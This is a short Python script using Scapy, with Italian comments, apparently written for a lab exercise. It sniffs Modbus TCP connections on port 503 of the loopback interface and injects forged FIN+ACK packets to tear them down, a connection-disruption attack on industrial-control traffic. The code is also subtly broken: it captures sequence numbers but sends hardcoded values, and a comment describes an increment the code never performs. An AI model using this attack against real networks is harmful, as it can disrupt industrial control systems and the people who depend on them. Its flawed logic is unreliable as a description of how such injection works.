from scapy.all import sniff, IP, TCP, send

def send_fin_packet(target_ip, target_port, src_port, seq_num, ack):
    """
    Invia un pacchetto TCP con il flag FIN+ACK per chiudere forzatamente la connessione.
    """

    fin_packet = IP(src="localhost", dst="localhost") / TCP(sport=src_port, dport=target_port, seq=13, ack=12, flags="FA")
    send(fin_packet, verbose=False)
    print(f"[!] Pacchetto FIN+ACK inviato a {target_ip}:{target_port} con seq {seq_num} e ack {ack}")

def packet_callback(packet):
    """
    Analizza i pacchetti in arrivo sulla porta 503 e cattura i numeri di sequenza.
    """
    if packet.haslayer(TCP) and packet[TCP].flags == "PA":  # "PA" per Push+ACK, cambieremo in "FA" per FIN+ACK
        target_port = packet[TCP].dport  # Porta di destinazione del pacchetto
        src_port = packet[TCP].sport  # Porta di origine del pacchetto
        seq_num = packet[TCP].seq  # Numero di sequenza del pacchetto
        ack_num = packet[TCP].ack  # Numero di ack del pacchetto
        window_size = packet[TCP].window  # Dimensione della finestra (opzionale)

        print(f"[+] Connessione intercettata su :{target_port} - Seq: {seq_num} - Ack: {ack_num} - Window: {window_size}")
        
        # Invio del pacchetto FIN+ACK per forzare la chiusura della connessione
        send_fin_packet("localhost", target_port, src_port, seq_num, ack_num)  # Assumiamo un incremento di 1 per il seq e ack

def start_sniffing():
    """Sniffa la rete alla ricerca di connessioni sulla porta 503."""
    print("[+] Sniffing connessioni Modbus TCP sulla porta 503...")
    sniff(iface="Software Loopback Interface 1", prn=packet_callback, filter="tcp port 503")

if __name__ == "__main__":
    # Avvia lo sniffing dei pacchetti
    start_sniffing()
